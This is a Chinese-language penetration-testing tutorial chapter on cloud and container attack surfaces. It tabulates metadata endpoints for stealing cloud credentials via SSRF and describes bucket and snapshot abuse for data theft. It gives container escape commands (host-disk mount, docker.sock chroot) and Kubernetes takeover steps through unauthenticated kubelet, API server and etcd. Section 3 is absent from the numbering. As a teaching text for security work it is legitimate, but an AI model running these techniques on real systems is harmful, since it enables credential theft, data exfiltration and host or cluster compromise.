# 云与容器攻击面

## 1. 知识点讲解

云上渗透的核心差异：攻击对象从「机器」变成「身份与配置」。一条黄金链：SSRF/泄露 → 元数据拿临时凭据 → 云 API 枚举权限 → 存储/快照/函数计算扩大战果。容器侧核心：判断身处容器 → 找逃逸面（特权/挂载/内核）→ 拿宿主机或集群。

## 2. 元数据服务（云渗透第一站）

| 云商 | 元数据地址 | 凭据路径 |
| --- | --- | --- |
| AWS | 169.254.169.254 | `/latest/meta-data/iam/security-credentials/<role>`（IMDSv2 需先 PUT 拿 token） |
| 阿里云 | 100.100.100.200 | `/latest/meta-data/ram/security-credentials/<role>` |
| 腾讯云 | metadata.tencentyun.com | `/latest/meta-data/cam/security-credentials/<role>` |
| GCP | metadata.google.internal | `/computeMetadata/v1/instance/service-accounts/default/token`（需头 `Metadata-Flavor: Google`） |
| Azure | 169.254.169.254 | `/metadata/identity/oauth2/token`（需头 `Metadata: true`） |

SSRF 打元数据 = 云上最高性价比动作（见 02-02）；拿到 STS 临时凭据后：`export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`。

## 4. 存储与快照

- 公开桶：URL 风格枚举（bucket.oss-cn-beijing.aliyuncs.com）、工具 cloud_enum/OSSFinder。
- 桶策略错误：匿名 PutObject → 传马挂黑页；GetObject 遍历 → 拖库。
- 快照共享：云盘快照可跨账号共享——拿到高权后建快照共享给自己 = 完美的数据窃取通道（低调、合法 API）。
- Serverless：函数计算注入（事件参数注入命令）、层（Layer）投毒。

## 5. 容器逃逸

```bash
# 判断在容器里
ls /.dockerenv; cat /proc/1/cgroup | grep -Ei "docker|kubepods|containerd"
capsh --print | grep cap_sys_admin           # 特权面

# 逃逸路径
① 特权容器（--privileged）：
   fdisk -l → mkdir /mnt/host && mount /dev/sda1 /mnt/host → chroot /mnt/host
② 挂载了 docker.sock：
   docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
③ 挂载敏感目录（/、/etc、/root 可写）→ 直接写宿主文件
④ 内核漏洞（DirtyPipe 等对容器同样有效）
⑤ cap_sys_module/ptrace 等危险能力利用
```

## 6. Kubernetes 攻击面

| 暴露点 | 利用 |
| --- | --- |
| kubelet 10250 未授权 | `curl -k https://node:10250/runningpods/` → `/exec` 直接容器内执行 |
| API Server 8080 未授权 | `kubectl -s http://x:8080 get pods` → 创建特权 pod 逃逸 |
| etcd 2379 未授权 | 读全部 secret（含 token） |
| Dashboard 暴露 | 默认令牌/弱口令接管集群 |
| ServiceAccount token | 容器内 `/var/run/secrets/kubernetes.io/serviceaccount/token` → 打 API Server |
| 镜像仓库 Harbor/Nexus | 弱口令 → 镜像投毒 → 供应链 |

## 7. 使用场景

- Web SSRF 打出云凭据 → 云助手批量 RCE 内网 ECS → 传统内网流程（05）。
- 打点发现 K8s Dashboard → 集群接管 → 全量容器 = 全量业务。
- 目标主体上云，公网无洞 → 查 AK 泄露与公开桶（OSINT 延伸）。
